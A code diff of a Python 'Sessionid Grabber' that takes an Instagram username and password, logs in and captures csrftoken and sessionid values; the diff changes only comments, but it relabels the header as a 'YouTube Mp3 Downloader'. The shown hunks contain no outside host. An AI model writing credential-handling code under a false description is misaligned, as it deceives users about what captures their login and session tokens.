@@ -1,14 +1,15 @@
-# Copyright © 2022 All Rights Reserved
-# Developed & Programmed By Null
-# For More Information Contact @entrysquad (IG)
+# Copyright (c) 2022 All Rights Reserved / Null
+# YouTube Mp3 Downloader Developed & Programmed By Null
+# Gain our Friendsip - @entrysquad (IG) @overexcited (T)
 
+# Libraries
 import requests
 import os
 import colorama
 from colorama import Fore
 from os import system
 colorama.init(autoreset=True)
-system("title " + "SessionID Grabber - By Null")
+system("title " + "Sessionid Grabber - By Null")
 
 r1 = requests.session() 
 imz = { 
@@ -35,7 +36,7 @@ logo = f"""
 """
 print(Fore.CYAN+logo)
 
-# Def Function
+# Username & Password
 def login(): 
     global csrftoken , username 
     global ds 
@@ -67,7 +68,7 @@ def login():
     login_data = { 
         "username": username, 
         "enc_password": '#PWD_INSTAGRAM_BROWSER:0:&:' + password} 
-# Def Function
+# Inc. Password
     def login2(): 
         global ig_did, csrftoken, sessionid 
         login2 = r1.post(login_url, data=login_data, headers=login_headers) 
@@ -135,4 +136,4 @@ def login():
             quit() 
     login2() 
 login()
-# End Codding
+# End /
